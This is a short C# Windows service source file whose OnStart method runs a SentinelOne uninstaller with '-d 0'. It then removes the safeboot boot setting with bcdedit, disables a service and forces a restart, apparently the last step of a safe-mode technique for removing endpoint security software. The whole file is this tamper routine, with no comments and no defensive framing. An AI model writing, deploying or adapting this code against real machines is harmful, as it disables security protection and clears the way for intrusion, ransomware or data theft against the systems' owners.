using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
namespace WindowsService1
{
    public partial class Service12 : ServiceBase
    {  
        public Service12()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            string strCmdText;
            string pathtosent;
            pathtosent = "C:\\SentinelUninstaller.exe";
            strCmdText = "/C " + '"' + pathtosent + '"' + " -d 0";
            System.Diagnostics.Process.Start("Cmd.exe", strCmdText);
            System.Diagnostics.Process.Start("Cmd.exe", "/C bcdedit /deletevalue {default} safeboot & timeout 120");
            System.Diagnostics.Process.Start("cmd.exe", "/C sc config service1 start=disabled");
            System.Diagnostics.Process.Start("cmd.exe", "/C shutdown /r");
        }
        
        }
    }
